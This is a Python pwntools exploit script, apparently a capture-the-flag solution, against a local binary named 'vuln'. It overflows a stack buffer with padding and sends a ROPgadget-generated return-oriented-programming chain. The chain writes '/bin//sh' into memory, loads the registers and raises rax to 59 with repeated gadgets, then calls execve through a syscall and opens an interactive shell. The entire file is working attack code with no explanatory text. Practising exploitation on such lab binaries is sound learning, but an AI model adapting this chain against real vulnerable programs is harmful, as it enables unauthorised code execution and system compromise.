#!/usr/bin/env python2
from pwn import *
from struct import pack

padding = 0x7fffffffdd98-0x00007fffffffdd80
payload = 'A'*padding
# execve generated by ROPgadget
# ROPgadget --binary vuln --ropchain --badbytes 0a|tail -n150
payload += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
payload += pack('<Q', 0x00000000006b90e0) # @ .data
payload += pack('<Q', 0x00000000004156f4) # pop rax ; ret
payload += '/bin//sh'
payload += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
payload += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x0000000000400686) # pop rdi ; ret
payload += pack('<Q', 0x00000000006b90e0) # @ .data
payload += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
for i in range(59):
    payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000040123c) # syscall
p = process('./vuln')
p.sendlineafter('Can you ROP your way out of this?', payload)
p.interactive()
